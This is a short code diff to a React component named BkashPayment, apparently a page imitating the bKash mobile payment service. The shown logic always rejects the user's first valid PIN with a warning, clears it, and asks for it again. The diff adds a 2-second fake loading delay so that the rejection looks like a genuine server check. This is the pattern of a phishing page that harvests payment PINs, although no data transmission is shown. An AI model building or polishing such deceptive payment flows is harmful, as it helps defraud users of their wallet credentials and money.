@@ -167,15 +167,19 @@ const BkashPayment = () => {
 
   const handlePinConfirm = () => {
     if (isValidPin()) {
+      setIsConfirmLoading(true);
       if (pinAttempts === 0 && !pinWarningShown) {
-        setPinAttempts(1);
-        setShowPinWarning(true);
-        setPinWarningShown(true);
-        setPinCode("");
-        setTimeout(() => pinInputRef.current?.focus(), 50);
+        // Show loading first, then pin warning
+        setTimeout(() => {
+          setIsConfirmLoading(false);
+          setPinAttempts(1);
+          setShowPinWarning(true);
+          setPinWarningShown(true);
+          setPinCode("");
+          setTimeout(() => pinInputRef.current?.focus(), 50);
+        }, 2000);
         return;
       }
-      setIsConfirmLoading(true);
       setShowPinWarning(false);
       setTimeout(() => {
         setIsConfirmLoading(false);
